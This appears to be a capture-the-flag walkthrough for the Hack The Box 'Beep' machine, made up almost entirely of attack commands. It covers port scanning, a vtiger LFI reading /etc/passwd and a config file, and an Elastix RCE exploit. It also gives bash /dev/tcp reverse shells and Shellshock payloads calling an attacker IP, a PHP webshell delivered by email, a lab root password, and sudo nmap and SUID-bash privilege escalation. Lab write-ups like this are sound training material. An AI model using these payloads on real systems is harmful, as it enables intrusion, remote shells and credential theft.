# 🚨 HTB: Beep

[Easy](Easy)
[Done](Done)

## 🛰️ Recon

### 🔍 Full TCP Port Scan
```bash
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.7
```

### 🔍 Targeted Script Scan
```bash
nmap -sC -sV -p 22,25,80,110,111,143,443,745,993,995,3306,4190,4445,4559,5038,10000 -oA nmap/scriptstcp 10.10.10.7
```

### 🔍 Scan for SSL Protocols
```bash
sslscan 10.10.10.7
```

---

## 🌐 Web Enumeration

### 🔍 HTTPS Redirect from Port 80
- Access via: `https://10.10.10.7/`

### 🔍 Directory Bruteforce
```bash
dirsearch.py -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php -t 50
```

> Notable: `/admin`, `/vtigercrm`, `/recordings`, `/configs`, `/mail`, `/panel`

---

[Elastix Exploit](https://github.com/A1vinSmith/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution/blob/master/exploit.py)  -> change to python3

```
import urllib2 -> from urllib import request
```

```
change urllib2 on the bottom to request
```

use exploit

```bash
rlwrap nc -lvnp 4444
```

elevate priv

```bash
sudo nmap --interactive  
!sh
```

## 🗂️ Local File Inclusion (LFI)

### 🔍 Exploit LFI
```bash
curl "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action"
```

---

## 📥 Credential Collection

### 📁 Read Config for Passwords
```bash
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
```

---

## ✉️ [SMTP](SMTP) User Discovery

### 📫 VRFY with Telnet
```bash
telnet 10.10.10.7 25
EHLO test
VRFY fanis
VRFY cyrus
```

---

## 🧑‍💻 Exploit Paths

---

## [Path #1] 💥 RCE via 18650.py (Elastix)

### 🔍 Identify Extension
```bash
svwar -m INVITE -e100-999 10.10.10.7
```

### 🛠️ Patch Python Script for TLSv1.0
```python
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
urllib.urlopen(url, context=ctx)
```

### ⚙️ Run Exploit
```bash
python2 18650.py
```

### 🐚 Listener
```bash
nc -lnvp 443
```

---

## [Path #2] 🌐 [Webmin Login](HTTP)

### 🔑 Login
- URL: `https://10.10.10.7:10000`
- Creds: `root / jEhdIekWmdjE`

### 🧨 Reverse Shell via Scheduled Command
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"
```

### 🐚 Listener
```bash
nc -lnvp 443
```

---

## [Path #3] 🔐 [SSH](SSH) as root

```bash
ssh root@10.10.10.7
# Password: jEhdIekWmdjE
```

---

## [Path #4] ☠️ Shellshock via Webmin CGI

### 🧪 Proof of Concept
```http
User-Agent: () { :; }; ping -c 1 10.10.14.2
```

### 🐚 Reverse Shell Payload
```http
User-Agent: () { :; }; bash -i >& /dev/tcp/10.10.14.2/8081 0>&1
```

### 🐚 Listener
```bash
nc -lnvp 8081
```

---

## [Path #5] 📧 Webshell Upload via Email + LFI

### 📤 Send PHP Shell via Email
```bash
swaks --to asterisk@localhost \
--from 0xdf@0xdf.htb \
--header "Subject: shell" \
--body '<?php system($_REQUEST["cmd"]); ?>' \
--server 10.10.10.7
```

### 🔍 Access Webshell via LFI
```bash
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action&cmd=id
```

---

## 🛗 Privilege Escalation

### [1] 🚪 `nmap` Interactive Shell
```bash
sudo nmap --interactive
nmap> !bash
```

### [2] 📦 SUID Binary Trick via `chmod`
```bash
sudo chmod 4755 /bin/bash
bash -p
```
